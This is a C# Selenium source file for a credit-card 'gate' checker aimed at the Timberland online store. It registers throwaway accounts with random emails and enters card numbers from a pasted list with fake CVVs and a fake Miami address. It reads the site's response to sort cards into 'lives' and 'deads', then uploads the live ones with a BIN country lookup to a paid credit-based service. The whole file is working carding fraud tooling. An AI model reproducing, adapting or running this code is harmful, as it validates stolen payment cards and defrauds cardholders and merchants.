using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace gateDanny.gates
{
    class Timber
    {
        ChromeDriver driver;
        check check = new check();
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {

            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                //MessageBox.Show(jsonString);
                dynamic cc = JsonConvert.DeserializeObject(jsonString);
                return cc.country.name;
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }
        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 15)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }

        private bool tiempoElementoeMAIL(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 15)
                {

                    if (IsElementPresent(By.XPath("//*[@id='refresh']")))
                    {
                        driver.FindElement(By.XPath("//*[@id='refresh']")).Click();
                        Thread.Sleep(1000);
                    }


                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        private bool tiempoElementoeMAILTR(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 15)
                {

                    if (IsElementPresent(By.XPath("//*[@id='inbox']/table/tbody/tr")))
                    {
                        driver.FindElement(By.XPath("//*[@id='inbox']/table/tbody/tr")).Click();
                        Thread.Sleep(1000);
                    }


                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }

        public void load()
        {

            check.login(Variables.key);
            if (int.Parse(Variables.creditos) <= 0)
            {
                MessageBox.Show("Recargue sus creditos");
                return;
            }

            var lines = Form1.listCC.Lines.Count();
            if (lines > 0 && Variables.run == true)
            {
                try
                {



                    Form1.circularProgressBar1.Value = 5;
                    var chromeOptions = new ChromeOptions();
                    correo = "joseffernana" + getNum() + "@gmail.com";
                    clave = "Jo." + getNum();

                    //chromeOptions.AddArguments(new List<string>() { "headless" });
                    //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, 
                    chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito", "--ignore-certificate-errors");

                    var chromeDriverService = ChromeDriverService.CreateDefaultService();
                    chromeDriverService.HideCommandPromptWindow = true;
                    //https://www.shopbop.com/jewelry-accessories/br/v=1/13539.htm
                    driver = new ChromeDriver(chromeDriverService, chromeOptions);
                    driver.Url = "https://www.timberland.com/shop/LogonForm?langId=-1&storeId=7101";
                    Thread.Sleep(1000);
                    correo = "joseffernana" + getNum() + "@gmail.com";
                    //GetEmail();

                    if (tiempoElemento(By.XPath("//*[@id='WC_VFMyAccountRegistrationForm_FormInput_firstName_In_Register_1']")))
                    {
                        driver.FindElementByXPath("//*[@id='WC_VFMyAccountRegistrationForm_FormInput_firstName_In_Register_1']").SendKeys("DANNY");
                        Thread.Sleep(500);
                        driver.FindElementByXPath("//*[@id='WC_VFMyAccountRegistrationForm_FormInput_lastName_In_Register_1']").SendKeys("GARCIA");
                        Thread.Sleep(500);
                        driver.FindElementByXPath("//*[@id='WC_VFMyAccountRegistrationForm_FormInput_logonId_In_Register_1']").SendKeys(correo);
                        Thread.Sleep(500);
                        driver.FindElementByXPath("//*[@id='WC_VFMyAccountRegistrationForm_FormInput_logonPassword_In_Register_1']").SendKeys(clave);
                        Thread.Sleep(500);
                        driver.FindElementByXPath("//*[@id='age-requirement-checkbox']").Click();
                        Thread.Sleep(500);
                        driver.FindElement(By.XPath("//*[@id='buttoncreateaccount']")).Click();
                        Thread.Sleep(1000);
                        if (tiempoElemento(By.Id("genderMale")))
                        {
                            //driver.FindElementById("genderMale").Click();
                            //Thread.Sleep(500);
                            //driver.FindElementByXPath("//*[@id='dob']").SendKeys("04/20/1993");
                            //Thread.Sleep(500);
                            //driver.FindElementById("zipCode").SendKeys("33624");
                            //Thread.Sleep(500);
                            //driver.FindElementById("phone1").SendKeys("218745"+RandomNumber(1000,9999));
                            //Thread.Sleep(500);
                            driver.FindElement(By.XPath("//*[@id='myaccount-profile-form-js']/div[5]/button[1]")).Click();
                            Thread.Sleep(1000);
                            if (IsElementPresent(By.XPath("//*[@id='creditcard-overview']/a/div")))
                            {
                                driver.FindElementByXPath("//*[@id='creditcard-overview']/a/div").Click();
                                Thread.Sleep(500);
                                if (IsElementPresent(By.Id("add-credit-card")))
                                {
                                    driver.FindElement(By.Id("add-credit-card")).Click();
                                    Thread.Sleep(1000);
                                    if (IsElementPresent(By.Id("card-number")))
                                    {
                                        pago();
                                    }
                                    else
                                    {
                                        restart();
                                    }
                                }
                                else
                                {
                                    restart();
                                }
                            }
                            else
                            {
                                restart();
                            }

                        }
                        else
                        {
                            restart();
                        }



                    }
                    else
                    {
                        restart();
                    }

                    var producto = "//*[@id='catalog-results']/div["+RandomNumber(3,25)+"]/div[2]/div[5]/a";
                    
                    //*[@id="catalog-results"]/div[23]/div[2]/div[5]/a



                    //"##PAGAAAAR##----------


                    //if (tiempoElemento(By.XPath(producto)))
                    //{
                    //    driver.Navigate().GoToUrl(driver.FindElementByXPath(producto).GetAttribute("href"));
                    //    Thread.Sleep(1000);

                    //    Form1.circularProgressBar1.Value = 20;

                    //    if (tiempoElemento(By.XPath("//*[@id='ecom-product-actions']/div[2]/button")))
                    //    {
                    //        driver.FindElementByXPath("//*[@id='ecom-product-actions']/div[2]/button").Click();
                    //        Thread.Sleep(1000);
                    //        if (tiempoElemento(By.XPath("//*[@id='checkout']/a")))
                    //        {
                    //            driver.FindElementByXPath("//*[@id='checkout']/a").Click();
                    //            Thread.Sleep(1000);
                    //            if (tiempoElemento(By.XPath("//*[@id='body-container']/article/section/div[2]/section[1]/aside[2]/div[3]/div/div[1]/a")))
                    //            {
                    //                driver.FindElementByXPath("//*[@id='body-container']/article/section/div[2]/section[1]/aside[2]/div[3]/div/div[1]/a").Click();
                    //                Thread.Sleep(1000);
                    //                if (IsElementPresent(By.Id("guest-email")))
                    //                {
                    //                    driver.FindElementById("guest-email").SendKeys(correo);
                    //                    Thread.Sleep(500);
                    //                    driver.FindElement(By.XPath("//*[@id='signin']/section/button")).Click();
                    //                    Thread.Sleep(1000);
                    //                    if (tiempoElemento(By.Id("first-name")))
                    //                    {
                    //                        driver.FindElementById("first-name").SendKeys("JOSE");
                    //                        Thread.Sleep(500);
                    //                        driver.FindElementById("last-name").SendKeys("REYES");
                    //                        Thread.Sleep(500);
                    //                        driver.FindElementById("address-1").SendKeys("1 Aeropost Way");
                    //                        Thread.Sleep(500);
                    //                        driver.FindElementById("zipcode").SendKeys("33206");
                    //                        Thread.Sleep(100);
                    //                        Thread.Sleep(500);
                    //                        driver.FindElementById("city-name").SendKeys("MIAMI");
                    //                        Thread.Sleep(500);
                    //                        var estado = new SelectElement(driver.FindElementById("state-name"));
                    //                        estado.SelectByValue("FL");
                    //                        Thread.Sleep(500);
                    //                        driver.FindElementById("phone-1").SendKeys("213521"+RandomNumber(1000,9999));
                    //                        Thread.Sleep(1000);
                    //                        driver.FindElement(By.XPath("//*[@id='body-container']/article/section/div[2]/section[1]/aside[2]/div[3]/div/form/div")).Click();
                    //                        Thread.Sleep(1000);
                    //                        if (tiempoElemento(By.Id("card-number")))
                    //                        {
                    //                            pago();
                    //                        }
                    //                        else
                    //                        {
                    //                            restart();
                    //                        }
                    //                    }
                    //                    else
                    //                    {
                    //                        restart();
                    //                    }
                    //                }
                    //                else
                    //                {
                    //                    restart();
                    //                }
                    //            }
                    //            else
                    //            {
                    //                restart();
                    //            }
                    //        }
                    //        else
                    //        {
                    //            restart();
                    //        }
                    //    }
                    //    else
                    //    {
                    //        restart();
                    //    }

                       
                    //}
                    //else
                    //{
                    //    restart();
                    //}






                }
                catch (Exception ex)
                {

                    if (Variables.run == true)
                    {
                        restart();
                    }
                    else
                    {
                        stop();
                    }
                }

            }
            else
            {
                stop();
            }
        }

        private void GetEmail()
        {
            try
            {
                //###--obtener email--#####
                ((IJavaScriptExecutor)driver).ExecuteScript("window.open();");
                driver.SwitchTo().Window(driver.WindowHandles.Last());
                Thread.Sleep(300);
                driver.Url = "https://www.abandonmail.com/es";
                Thread.Sleep(5000);

                if (tiempoElemento(By.XPath("//*[@id='randombtn']")))
                {
                    driver.FindElement(By.XPath("//*[@id='randombtn']")).Click();
                    Thread.Sleep(1000);
                }
                else
                {

                    restart();
                }

                if (tiempoElemento(By.XPath("//*[@id='emailtouse']")))
                {
                    correo = driver.FindElement(By.XPath("//*[@id='emailtouse']")).GetAttribute("value");
                    Thread.Sleep(1000);
                }
                else
                {

                    restart();
                }

                Thread.Sleep(1000);

                driver.SwitchTo().Window(driver.WindowHandles.First());
            }
            catch (Exception ex)
            {


                if (Variables.run == true)
                {
                    restart();
                }
                else
                {
                    stop();
                }
            }






        }


        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(1500);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {
            try
            {
                pagos = 0;

                driver.Close();
                driver.Quit();
                load();
            }
            catch (Exception)
            {
                pagos = 0;
                driver.Quit();
                load();
            }

        }

        private void pago()
        {
            try
            {
                var lines = Form1.listCC.Lines.Count();


                if (lines > 0 && Variables.run == true)
                {
                    if (pagos < 10)
                    {
                        Form1.circularProgressBar1.Value = 90;
                        string cc = Form1.listCC.Lines[0];
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];




                        if (IsElementPresent(By.Id("card-number")))
                        {
                            driver.FindElementById("card-number").SendKeys(ccnum);
                            Thread.Sleep(500);
                            var mes = new SelectElement(driver.FindElementById("month-name"));
                            mes.SelectByValue(ccLine[1]);
                            Thread.Sleep(1000);
                            var anio = new SelectElement(driver.FindElementById("year"));
                            anio.SelectByValue(ccLine[2]);
                            Thread.Sleep(1000);

                            driver.FindElementById("security-code").Clear();
                            Thread.Sleep(100);

                            if (ccLine[3].Trim().Length == 3)
                            {
                                driver.FindElementById("security-code").SendKeys("000");

                            }
                            else
                            {
                                driver.FindElementById("security-code").SendKeys("4565");
                            }

                            Thread.Sleep(1000);

                            //if (pagos == 0)
                            //{
                                driver.FindElementById("first-name").SendKeys("JOSE");
                                Thread.Sleep(500);
                                driver.FindElementById("last-name").SendKeys("REYES");
                                Thread.Sleep(500);
                                driver.FindElementById("address-1").SendKeys("1 way Aeropost");
                                Thread.Sleep(500);
                                driver.FindElementById("zipcode").SendKeys("33206"+ OpenQA.Selenium.Keys.Tab);
                                Thread.Sleep(100);
                                Thread.Sleep(500);
                                driver.FindElementById("city-name").SendKeys("MIAMI");
                                Thread.Sleep(500);
                                var estado = new SelectElement(driver.FindElementById("state-name"));
                                estado.SelectByValue("FL");
                                Thread.Sleep(500);
                                driver.FindElementById("phone-1").SendKeys("213521" + RandomNumber(1000, 9999));
                                Thread.Sleep(1000);
                            //}


                            driver.FindElement(By.Id("save-credit-card")).Click();
                            Thread.Sleep(5000);

                           


                        }
                        else
                        {
                            restart();
                        }

                        if (confirmar())
                        {
                            Form1.circularProgressBar1.Value = 100;
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "lives");
                            Form1.textBox1.AppendText(cc + " $" + RandomNumber(5, 15) + ".00  - " + checkbin(cc.Substring(0, 6)));
                            check.playlive();
                            Console.WriteLine("live - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox1.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            Form1.circularProgressBar1.Value = 100;
                            var guardar = numeroTargeta + " - " + cc + " - "+ Variables.gate;
                            check.ccss(Variables.key, guardar, "deads");
                            Thread.Sleep(300);
                            Form1.textBox2.AppendText(cc);
                            Console.WriteLine("dead - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox2.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            pago();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
                else
                {
                    stop();
                }
            }
            catch (Exception ex)
            {
                if (Variables.run == true)
                {
                    restart();
                }
                else
                {
                    stop();
                    return;
                }
                //MessageBox.Show(ex.ToString());

            }

        }


        private void pago2()
        {
            try
            {
                var lines = Form1.listCC.Lines.Count();


                if (lines > 0 && Variables.run == true)
                {
                    if (pagos < 3)
                    {
                        Form1.circularProgressBar1.Value = 90;
                        string cc = Form1.listCC.Lines[0];
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];




                        if (IsElementPresent(By.Id("ccnumber")))
                        {
                            driver.FindElement(By.Id("ccnumber")).SendKeys(ccnum);
                            Thread.Sleep(200);
                            var mescc = new SelectElement(driver.FindElement(By.Name("creditCardViewBean.expirationMonth")));
                            mescc.SelectByValue(Int16.Parse(ccLine[1]).ToString());
                            Thread.Sleep(200);
                            var aniocc = new SelectElement(driver.FindElement(By.Name("creditCardViewBean.expirationYear")));
                            aniocc.SelectByValue(Int16.Parse(ccLine[2]).ToString());
                            Thread.Sleep(200);
                            driver.FindElement(By.XPath("//*[@id='continue']")).Click();
                            Thread.Sleep(1000);

                            if (tiempoElemento(By.Id("finalizeOrder")))
                            {
                                driver.FindElement(By.Id("finalizeOrder")).Click();
                                Thread.Sleep(2000);
                            }
                            else
                            {
                                restart();
                            }
                        }
                        else
                        {
                            restart();
                        }

                        if (confirmar2())
                        {
                            Form1.circularProgressBar1.Value = 100;
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "lives");
                            Form1.textBox1.AppendText("live " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
                            check.playlive();
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox1.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            Form1.circularProgressBar1.Value = 100;
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "deads");
                            Thread.Sleep(300);
                            Form1.textBox2.AppendText("dead " + numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)));
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Form1.textBox2.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            pago2();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
                else
                {
                    stop();
                }

            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString());

                if (Variables.run == true)
                {
                    restart();
                }
                else
                {
                    stop();
                }

            }
        }

        public void stop()
        {
            try
            {
                pagos = 0;
                numeroTargeta = 0;
                driver.Close();
                driver.Quit();
            }
            catch (Exception ex)
            {

                Console.WriteLine(ex.ToString());
            }

        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 10)
                {


                    if (IsElementPresent(By.CssSelector("#body-container > article > section.page-messaging.page-messaging-section.page-messaging-js > div > p:nth-child(1)")))
                    {
                        if (driver.FindElement(By.CssSelector("#body-container > article > section.page-messaging.page-messaging-section.page-messaging-js > div > p:nth-child(1)")).Displayed == true)
                        {
                            if (driver.FindElement(By.CssSelector("#body-container > article > section.page-messaging.page-messaging-section.page-messaging-js > div > p:nth-child(1)")).Text.Trim() != "")
                            {

                                estado = "dead";

                            }



                        }
                    }

                    if (IsElementPresent(By.CssSelector("#body-container > article > section.page-messaging.page-messaging-section.page-messaging-js > div > p.message.page-message-text.page-messaging-message.success")))
                    {
                        if (driver.FindElement(By.CssSelector("#body-container > article > section.page-messaging.page-messaging-section.page-messaging-js > div > p.message.page-message-text.page-messaging-message.success")).Displayed == true)
                        {
                            if (driver.FindElement(By.CssSelector("#body-container > article > section.page-messaging.page-messaging-section.page-messaging-js > div > p.message.page-message-text.page-messaging-message.success")).Text.Trim() != "")
                            {
                                estado = "live";
                            }
                        }
                    }




                }
                else
                {
                    estado = "error";
                }

                tiempo++;
            }

            if (estado == "dead")
            {
                Thread.Sleep(500);
                driver.Navigate().Refresh();
                Thread.Sleep(2000);


                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }


        public bool confirmar2()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 10)
                {


                    if (IsElementPresent(By.XPath("//*[@id='confirm']/div[2]/div[2]")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='confirm']/div[2]/div[2]")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='confirm']/div[2]/div[2]")).Text.Trim() != "")
                            {
                                estado = "dead";
                            }
                        }
                    }

                    if (IsElementPresent(By.XPath("//*[@id='content']/div[1]/h1")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='content']/div[1]/h1")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='content']/div[1]/h1")).Text.Trim() != "")
                            {
                                estado = "live";
                            }
                        }
                    }

                    if (IsElementPresent(By.XPath("//*[@id='confirm']/div[2]/div[2]")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='confirm']/div[2]/div[2]")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='confirm']/div[2]/div[2]")).Text.Trim() != "")
                            {
                                estado = "dead";
                            }
                        }
                    }


                }
                else
                {
                    estado = "error";
                }

                tiempo++;
            }

            if (estado == "dead")
            {
                Thread.Sleep(1000);
                if (tiempoElemento(By.XPath("//*[@id='submitOrderForm']/div[1]/div/div[2]/div[1]/a")))
                {
                    Thread.Sleep(1000);
                    driver.FindElementByXPath("//*[@id='submitOrderForm']/div[1]/div/div[2]/div[1]/a").Click();
                    Thread.Sleep(500);
                    if (tiempoElemento(By.Id("addCreditCardButton")))
                    {
                        Thread.Sleep(2000);
                        driver.FindElementById("addCreditCardButton").Click();
                        Thread.Sleep(1000);
                        if (tiempoElemento(By.Id("ccnumber")))
                        {
                            return false;
                        }
                        else
                        {

                            restart();
                            return false;
                        }

                    }
                    else
                    {
                        restart();
                        return false;
                    }

                }
                else
                {
                    restart();
                    return false;
                }


            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }
        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }


    }
}

